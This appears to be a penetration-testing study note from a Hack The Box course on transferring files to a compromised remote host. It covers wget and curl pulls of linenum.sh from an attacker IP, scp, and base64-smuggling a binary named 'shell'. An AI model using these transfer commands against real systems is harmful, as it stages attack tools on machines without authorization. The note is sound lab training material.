
## Using wget :

  - First set an HTTP_server ([[Linux/Cheet Sheat/Linux Commands]])with python on the Host-Machine :

	```SHELL
	Thibovski@htb[/htb]$ cd /tmp

	Thibovski@htb[/htb]$ python3 -m http.server 8000


  Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

  - Go to the download Link on the remote host, and download your Files with #wget:

	```SHELL
	user@remotehost$ wget http://10.10.14.1:8000/linenum.sh
	...SNIP...
	Saving to: 'linenum.sh'
				linenum.sh 100[==============================================>] 
				144.86K  --.-KB/s    in 0.02s
 
	2021-02-08 18:09:19 (8.16 MB/s) - 'linenum.sh' saved
	[14337/14337]
  ```
  

- If the remote server doesnt have wget, we can use cURL to download the File :

 ```SHELL
user@remotehost$ curl http://10.10.14.1:8000/linenum.sh -o linenum.sh

100  144k  100  144k    0     0  176k      0 --:--:-- --:--:-- --:--:-- 176k

```

- ```-o``` to specify the output file name 

## Using SCP ( Secure Copy ) :

- After gaining access with SSH we can transfer out Data via #SCP.

```shell
scp <filename> user@<remotehost_IP>:remote_directory
```
- Ex : 
```SHELL
Thibovski@htb[/htb]$ scp linenum.sh user@remotehost:/tmp/linenum.sh
user@remotehost's password: *********

linenum.sh
```

## Using Base64 :

Look also at the Chapitre [[Offsec/Information Security Foundations/Web Requests/JAVASCRIPT DEOBFUSCATION]]

- In some cases we dont even have the right privileges to copy files. in this case we can only use #Base64 to encode the file into a Base64 format and past it to the remote server and decode it .
- In this exemple we decode a binary file called shell and transfer it into the remote host and then decode it :

	- Localmachine :

  ```SHELL
  Thibovski@htb[/htb]$ base64 shell -w 0

  
	f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU
```

	- Remotehost :

  ```SHELL
  user@remotehost$ echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d > shell
  ```
  